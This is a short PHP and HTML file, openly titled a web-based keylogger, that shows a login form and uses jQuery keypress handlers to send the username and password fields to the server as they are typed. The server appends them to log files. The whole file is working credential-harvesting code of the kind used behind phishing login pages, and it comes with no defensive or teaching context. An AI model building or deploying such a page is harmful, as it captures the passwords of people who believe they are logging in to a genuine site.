<?php
if(!empty($_SERVER["HTTP_X_REQUESTED_WITH"]) && strtolower($_SERVER["HTTP_X_REQUESTED_WITH"]) == "xmlhttprequest") {
  if(isset($_POST["user"]) && !empty($_POST["user"])) {
    $file = "username_logs.txt";
    $keys = $_POST["user"]."\n";
    $text = fopen($file, "a");
    fwrite($text, $keys);
    fclose($text);
  }

  if(isset($_POST["pass"]) && !empty($_POST["pass"])) {
    $file = "password_logs.txt";
    $keys = $_POST["pass"]."\n";
    $text = fopen($file, "a");
    fwrite($text, $keys);
    fclose($text);
  }

}
 ?>
<html>
<head>
<title>Simple Web base Keylogger!</title>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
<script>
$(document).ready(function () {

  $("#user").on("keypress", function () {
    var user = $("#user").val();
      $.ajax({
        url: '<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>',
        type: 'POST',
        data: {user: user}
      });

  });

  $("#pass").on("keypress", function () {
    var pass = $("#pass").val();
      $.ajax({
        url: '<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>',
        type: 'POST',
        data: {pass: pass}
      });

  });

});
</script>
</head>
<body style="background:gray;">
  <center><h1>Login</h1>
<center>
<form action="" method="post" style="padding:30px;">
  <input type="text" name="user" id="user" placeholder="Enter Username"></input><br />
  <input type="password" name="pass" id="pass" placeholder="Please Enter Password"></input><br />
  <input type="submit" id="btn" value="Login"></input>
</form>
</center>

</body>
</html>
